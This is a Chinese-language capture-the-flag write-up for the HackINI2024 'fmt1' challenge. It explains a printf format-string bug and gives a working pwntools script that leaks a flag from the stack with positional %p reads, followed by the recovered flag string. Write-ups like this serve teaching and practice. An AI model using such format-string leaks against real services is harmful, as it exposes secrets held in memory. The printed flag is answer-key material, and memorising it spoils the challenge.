# HackINI2024 fmt1

## 题目简述

服务启动后把 `flag.txt` 读入 `main()` 的栈缓冲区，再将用户输入直接作为 `printf()` 的格式字符串。程序允许交互 10 次，目标是利用位置参数逐个泄露栈上的 flag 数据。

## 解题过程

漏洞点为：

```c
fgets(flag, 0x100, file);

for (int i = 0; i < 10; i++) {
    fgets(buf, 0x40, stdin);
    printf(buf);
}
```

因为 `printf(buf)` 没有固定格式模板，输入 `%N$p` 可以读取第 $N$ 个参数位置对应的栈值。对附件二进制定位后，flag 从第 14 个位置开始。每次读取一个 64 位值，将十六进制整数按小端序还原为 8 个原始字节，并递增位置：

```python
from pwn import *

io = process("./chall")
io.recvline()

flag = b""
for index in range(14, 24):
    io.sendlineafter(b"> ", f"%{index}$p|".encode())
    value = int(io.recvuntil(b"|", drop=True), 16)
    chunk = p64(value)
    flag += chunk
    if b"\x00" in chunk:
        break

flag = flag.split(b"\x00", 1)[0].rstrip(b"\n")
print(flag.decode())
```

得到：

```text
shellmates{My_FiR$T_f0RmAt_sTRinG!}
```

## 方法总结

格式字符串读漏洞的重点是确定参数偏移和正确还原字节序。`%p` 输出的是整数形式的机器字，而原始字符串按小端序分布在栈中，所以应使用 `p64()` 重新打包。题目限制为 10 次交互，而 flag 占用的机器字数量在该范围内，能够逐块完整泄露。
